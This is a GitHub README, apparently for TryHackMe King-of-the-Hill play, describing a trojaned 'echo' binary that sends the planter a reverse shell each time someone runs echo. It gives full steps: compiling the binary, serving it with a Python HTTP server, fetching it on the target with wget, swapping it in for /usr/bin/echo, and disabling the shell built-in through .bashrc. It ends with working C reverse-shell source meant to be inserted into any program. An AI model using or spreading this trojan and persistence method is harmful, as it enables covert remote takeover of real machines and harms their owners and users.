# Malicious Binary - echo for KoTH | TryHackMe



##  What does it do? <br />

1. This custom-echo will give you a reverse shell on a custom port that you set as PORT in the c code.
2. How is works is, whenever somebody runs an echo command on the machine in which you planted your custom-echo, it will send you a reverse shell! :shipit:<br />
3. This can be used in multiple ways, but in this case, we are using a reverse shell c code embedded in the raw echo.c code, that you can obtain via GitHub. (Linux, open-source! Yay.)

---------------
### How to use it?<br />

  - first, let's clone the repo:<br />
    
     ```bash
     git clone https://github.com/hoodietramp/custom-echo
     ```

  - now let's `cd` into it:<br />

     ```
     cd custom-echo
     ```

  - now, we got to compile it first:<br />

     ```
     gcc -o custom-echo custom-echo.c
     ```
     > You can also add static flag to compile it on your machine and have it ready to use on almost all linux machines.
     ```
     gcc -o custom-echo custom-echo.c --static
     ```

  - give it executable permissions:<br />
    
     ```
     chmod +x custom-echo
     ```
     
  - Now transfer it to the machine, in which you want to use it:<br />

     - [x] start a python server in your machine 

     - [x]  ```python3 -m http.server 80```

     - [x] Now, on the target machine,
         ``` wget LOCAL-IP/custom-echo; chmod +x custom-echo```
     
     - [x] This is potentially machine breaking, as we will be swapping our malicious binary with the default echo on the machine. 
       DO NOT TRY THIS ON YOUR OWN MACHINE.
       
       ```mv `which echo` /tmp/.tmpecho; cp custom-echo /usr/bin/echo```
       
     - [x] but it'll still not work because echo is a shell-built-in, means it doesn't require any external binary to work in Linux<br /> To fix this, use the following commands:<br />
            ```enable -n echo```<br />
            ```echo "alias echo='/usr/bin/echo'" >> ~/.bashrc```<br />
     - [x] Now we're ready to get our reverse shell. Let's see it in action. < 3

-----------------
##### Testing custom-echo:<br />

![image](images/echo.png)

![image](images/nc.png)

------------------

For users who want to play around with this code themselves, you can just take the below snippet and add it as called-function in any c code and compile it using the same process that we used above. (CBA with adding proper includes, if you are in this section, then you likely know how to.)
```C
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

int caller()
{
    struct sockaddr_in sa;
    int s;
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr("<ip>");
    sa.sin_port = htons(<port>);
    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);
    execl("/bin/bash","bash","-i",0,0);
    return 0;
}
# Obviously call the caller func after some primary function of the code you are adding it in.
```

